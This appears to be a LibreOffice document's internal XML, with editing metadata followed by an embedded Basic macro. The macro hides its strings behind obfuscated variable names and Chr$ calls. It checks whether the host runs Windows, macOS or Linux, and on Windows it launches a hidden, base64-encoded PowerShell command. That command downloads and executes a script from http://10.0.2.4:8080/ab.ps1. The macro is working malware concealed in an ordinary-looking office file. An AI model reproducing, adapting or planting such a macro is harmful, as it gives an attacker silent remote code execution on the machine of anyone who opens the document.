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inn3r </meta:initial-creator>
    <meta:creation-date>2017-02-06T15:15:47.35</meta:creation-date>
    <dc:date>2023-03-16T11:44:57.616000000</dc:date>
    <meta:editing-duration>PT44M22S</meta:editing-duration>
    <meta:editing-cycles>15</meta:editing-cycles>
    <meta:generator>LibreOffice/7.0.4.2$Windows_x86 LibreOffice_project/dcf040e67528d9187c66b2379df5ea440742977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jFHOtLiHZl as string

      Dim hm2C08K1fi as string, gCPjqRDvHw as string, IbNalgddRK as string, w3Jq5TTOG2 as string, cCcke7k3YY as string, dPREo1MkD5 as string

      hm2C08K1fi = "wi"
      gCPjqRDvHw = Chr$(110)
      IbNalgddRK = "do"
      w3Jq5TTOG2 = Chr$(119)
      cCcke7k3YY = Chr$(115)
      dPREo1MkD5 = hm2C08K1fi + gCPjqRDvHw + IbNalgddRK + w3Jq5TTOG2 + cCcke7k3YY

      dim ZLmgMk9nnT as string
      ZLmgMk9nnT = Chr$(111) + Chr$(115) + Chr$(120)

      dim d0rXns6W93 as string, a2Ml1Qi2d9h as string, EnATPZnlfa as string, owFECFhuNx as string
      d0rXns6W93 = Chr$(108) + Chr$(105)
      a2Ml1Qi2d9h = "n"
      EnATPZnlfa = Chr$(117) + Chr$(120)
      owFECFhuNx = d0rXns6W93 + a2Ml1Qi2d9h + EnATPZnlfa




      jFHOtLiHZl = ouHYwyUkMg
      If jFHOtLiHZl = dPREo1MkD5 OR jFHOtLiHZl = ZLmgMk9nnT OR jFHOtLiHZl = owFECFhuNx Then
        FB0AmhPQAP
      end If
    End Sub

    Sub FB0AmhPQAP
      Shell("cmd.exe /C ""powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADAALgAyAC4ANAA6ADgAMAA4ADAALwBhAGIALgBwAHMAMQAnACkA""")
    End Sub
    
    Function ouHYwyUkMg() as string
      Dim QGovyM6ytP as string, PSNG9AeJuG as string, dVAJHgDbcV as string, UfKHw2KwKP as string, ijKFou5hvN as string, TAShWPgLa7 as string

      QGovyM6ytP = Chr$(119) + Chr$(105)
      PSNG9AeJuG = Chr$(110)
      dVAJHgDbcV = "do"
      UfKHw2KwKP = Chr$(119)
      ijKFou5hvN = Chr$(115)
      TAShWPgLa7 = QGovyM6ytP + PSNG9AeJuG + dVAJHgDbcV + UfKHw2KwKP + ijKFou5hvN

      Dim z4c37SR3aA as string
      z4c37SR3aA = Chr$(111) + Chr$(115) + Chr$(120)

      dim hTjUzCOa39 as string, hiCOOW1TV0 as string, r2ZqwDHFnV1 as string, CGO7m357LE as string
      hTjUzCOa39 = Chr$(108) + Chr$(105)
      hiCOOW1TV0 = chr$(110)
      r2ZqwDHFnV1 = Chr$(117) + Chr$(120)
      CGO7m357LE = hTjUzCOa39 + hiCOOW1TV0 + r2ZqwDHFnV1



      select case getGUIType
        case 1:
          ouHYwyUkMg = TAShWPgLa7
        case 3:
          ouHYwyUkMg = z4c37SR3aA
        case 4:
          ouHYwyUkMg = CGO7m357LE
      end select
    End Function

    Function ZPE3arNcBJ() as string
    Dim jM9O1rwgsK as string, v5RJXLvBAv as string, CgkplbgD5f as string, EI2H5B9yf9 as string, Xk8SsFRo5a as string, rdvHMB9kps as string

      jM9O1rwgsK = "w"
      v5RJXLvBAv = Chr$(105) + Chr$(110)
      CgkplbgD5f = "d"
      EI2H5B9yf9 = Chr$(111)
      Xk8SsFRo5a = Chr$(119) + Chr$(115)
      rdvHMB9kps = jM9O1rwgsK + v5RJXLvBAv + CgkplbgD5f + EI2H5B9yf9 + Xk8SsFRo5a

      Dim ucm7QxwaiT as string
      ucm7QxwaiT = Chr$(101) + Chr$(120) + Chr$(101)

      Dim h0dIOJKHYP as string
      h0dIOJKHYP = Chr$(98) + Chr$(105) + Chr$(110)
      select case ouHYwyUkMg
        case rdvHMB9kps
          GetFileName = ucm7QxwaiT
        case else
          GetFileName = h0dIOJKHYP
      end select
    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